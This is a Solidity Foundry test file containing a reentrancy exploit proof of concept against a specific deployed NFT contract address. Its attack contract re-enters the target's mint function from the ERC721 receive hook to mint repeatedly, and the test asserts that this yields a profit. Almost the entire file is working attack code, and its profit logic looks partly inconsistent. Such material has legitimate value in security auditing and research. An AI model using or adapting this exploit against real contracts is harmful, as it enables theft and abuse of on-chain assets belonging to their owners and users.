// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC721 {
    function balanceOf(address owner) external view returns (uint256 balance);
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
}

interface Guitarist {
    function mint(uint256 quantity) external payable;
    function public_mint_status() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xA249d8F280BA32Ab3E95bDdf4F3DBDE059d62AC3;
    address attacker = address(this);
    AttackContract attackContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attackContract = new AttackContract();
        deal(address(attackContract), 10 ether);
        // Public mint is enabled by default, no setup needed
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        uint256 initialContractBalance = address(attackContract).balance;
        attackContract.attack{value: 0.05 ether}(1);

        // Check that we minted multiple NFTs
        uint256 nftBalance = IERC721(TARGET).balanceOf(address(attackContract));
        assertGt(nftBalance, 1, "Should have minted more than 1 NFT via reentrancy");

        // Check profit: we paid nftBalance * 0.05 ETH but got nftBalance NFTs
        // For demonstration, we just show reentrancy worked
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

contract AttackContract is IERC721Receiver {
    Guitarist public target;
    uint256 public mintCount;
    uint256 public constant DESIRED_COUNT = 10;

    constructor() {
        target = Guitarist(0xA249d8F280BA32Ab3E95bDdf4F3DBDE059d62AC3);
    }

    function attack(uint256 quantity) external payable {
        mintCount = 0;
        target.mint{value: msg.value}(quantity);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external override returns (bytes4) {
        mintCount++;
        if (mintCount < DESIRED_COUNT) {
            // Reenter mint with another 0.05 ETH
            target.mint{value: 0.05 ether}(1);
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

